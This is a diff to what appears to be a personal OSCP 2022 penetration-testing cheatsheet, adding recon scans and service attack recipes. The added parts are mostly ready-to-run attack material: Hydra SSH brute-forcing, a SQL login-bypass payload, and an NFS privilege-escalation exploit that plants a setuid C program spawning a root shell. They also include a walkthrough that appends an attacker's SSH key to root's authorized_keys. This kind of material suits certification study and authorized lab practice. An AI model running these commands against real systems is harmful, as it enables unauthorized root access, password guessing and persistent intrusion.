@@ -1,37 +1,60 @@
-# Recon
+# OSCP 2022 Cheatsheet
 
-Tips
-* Use BOTH `searchsploit` and `google` to find vulnerable service versions. Sometimes searchsploit may not have updated results.
 
-Network - Nmap
+### [Initial Recon](#Initial-Recon-1)  
+### [Services](#Services-1)
+### [Shells](#Shells-1)
+### [Linux Privilege Escalation](#Linux-Privilege-Escalation-1)
+### [Windows Privilege Escalation](#Windows-Privilege-Escalation-1)
+### [Compilation](#Compilation-1)
+### [MSFvenom Payload Generation](#MSFvenom-Payload-Generation-1)
+### [Password Cracking](#Password-Cracking-1)
+
+
+## Initial Recon
+
+Network scans
 ```
 $ sudo nmap -v -A [target]  # TCP default ports, OS detection, version detection, script scanning, and traceroute.
 $ sudo nmap -v -p- [target] # TCP all ports.
 $ sudo nmap -v -sU [target] # UDP default ports.
 
-# Aggressive scans
+# aggressive scans
 $ sudo nmap -sUV -T4 -F --version-intensity 0 [target]  # UDP aggresive
 $ sudo nmap -v -p- -T4 [target]                         # TCP all-ports aggressive
-
-# OR alternative fast scans w/ NmapAutomator
-$ nmapAutomator.sh [target] Full
 ```
 
-Web - Gobuster/Nikto/Nmap
+Web scans - Gobuster/Nikto/Nmap
 ```
-$ gobuster dir -u [target] -w ~/OSCP/SecLists/Discovery/Web-Content/[wordlist]
 $ nikto -host [target]
 $ sudo nmap -v -sV -p80,443 --script vuln [target]
+
+$ gobuster dir -u [target] -w SecLists/Discovery/Web-Content/common.txt                   # easiest
+^Alternate common wordlist /usr/share/wordlists/dirb/common.txt
+$ gobuster dir -u [target] -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt # dirs small
+$ gobuster dir -u [target] -w SecLists/Discovery/Web-Content/raft-small-files.txt         # files small
 ```
 
+## Services
 
 ### FTP [21 TCP]
+
+Tips
+* Switch on `binary` mode before transferring files.
+* Try `PUT` and `GET`.
 
 Anonymous login
 ```
 $ ftp [target]
 Name: anonymous
 Password
+```
+
+### SSH [22 TCP]
+
+Hydra SSH brute-force
+```
+$ hydra -L users.txt -P SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt [target] ssh -t 4
 ```
 
 ### SMTP [25 TCP]
@@ -55,8 +78,6 @@ SMTP user enumeration
 ```
 $ smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t [target]
 ```
-
-
 
 ### TFTP [69 UDP]
 
@@ -100,7 +121,7 @@ Brute-Force Logins
 $ cewl http://target.com
 ```
 
-Filter / file ext bypass
+Filter / file extension bypass
 ```
 %0d%0a
 %00
@@ -128,6 +149,8 @@ SQL Injection
 1. Test single and double quotes for *500 Internal Server Error* response.
 2. Manually test payloads or use Burp Intruder with SQL payloads.
 3. Grab password hashes or perform code exec to obtain reverse shell.
+* If authentication page is present, ALWAYS try **auth bypass payload** e.g. `' or '1'='1`
+* If time-based SQLi, you could also find a script to brute-force password one-char at-a-time.
 
 Apache Shellchock (/cgi-bin/*.cgi])
 ```
@@ -184,18 +207,17 @@ $ telnet [target] 110
 
 ### RPC/Portmapper [111, 135 TCP]
 
-General enum
+NFS shares
 ```
-$ rpcinfo -p [target]
-$ nmblookup -A [target]
-$ smbclient -L //[target]   // null session
-$ rpcclient -U "" [target]  // null session
-$ enum4linux [target]       // null session
-$ nbtscan [target]
+$ rpcinfo -p [target]                             # enum NFS shares
+$ showmount -e [ target IP ]                      # show mountable directories
+$ mount -t nfs [target IP]:/ /mnt -o nolock       # mount remote share to your local machine
+$ df -k                                           # show mounted file systems
 ```
 
 RPC client
 ```
+$ rpcclient -U "" [target]  // null session
 $ rpcclient -U "" -N [target]
 rpcclient> srvinfo
 rpcclient> enumdomains
@@ -211,6 +233,44 @@ rpcclient> queryuser 0x3601
 rpcclient> getusrdompwinfo 0x3601
 ```
 
+Exploit NFS shares for privesc:
+```
+$ showmount -e 192.168.xx.53
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+$ mkdir /tmp/mymount
+/bin/mkdir: created directory '/tmp/mymount'
+$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
+$ cat /root/Desktop/exploit.c
+#include <stdio.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+gcc exploit.c -m32 -o exploit
+
+$ cp /root/Desktop/x /tmp/mymount/
+$ chmod u+s exploit
+```
+
+Attack scenario: replace target SSH keys with your own
+```
+$ mkdir -p /root/.ssh
+$ cd /root/.ssh/
+$ ssh-keygen -t rsa -b 4096
+Enter file in which to save the key (/root/.ssh/id_rsa): hacker_rsa
+Enter passphrase (empty for no passphrase): Just Press Enter
+Enter same passphrase again: Just Press Enter
+$ mount -t nfs 192.168.1.112:/ /mnt -o nolock
+$ cd /mnt/root/.ssh
+$ cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/
+$ cat hacker_rsa.pub >> authorized_keys                     # add your public key to authorized_keys
+$ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using your private key
+```
+
 ### IMAP
 
 Pentesting IMAP: https://book.hacktricks.xyz/pentesting/pentesting-imap
@@ -223,6 +283,13 @@ Check Samba service version.
 
 
 ### SMB (WINDOWS SMB) [139, 445 TCP]
+
+```
+$ nmblookup -A [target]
+$ smbclient -L //[target]   // null session
+$ enum4linux [target]       // null session
+$ nbtscan [target]
+```
 
 Automated enum
 ```
@@ -596,8 +663,6 @@ STEP 2: Replace service binary with malicious binary and restart service.
 cmd> sc qc [servicename] restart
 ```
 
-
-
 ### File & Folder Permissions
 
 ### Access Token Abuse
@@ -703,6 +768,12 @@ Linux C to .SO (shared library)
 $ gcc -o exploit.so -shared exploit.c -fPIC 
 ```
 
+Linux compiles
+```
+$ gcc -m32 exploit.c -o exploit # 32 bit
+$ gcc -m64 exploit.c -o exploit # 64 bit
+```
+
 Linux 32/64bit cross-architecture ELF
 ```
 $ gcc -m32 -Wl,--hash-style=both exploit.c -o exploit
@@ -754,3 +825,4 @@ Hashcat
 $ hash-identifier [hash]    
 $ hashcat -m [hash-type] -a 0 [hash-file] [wordlist] -o cracked.txt
 ```
+
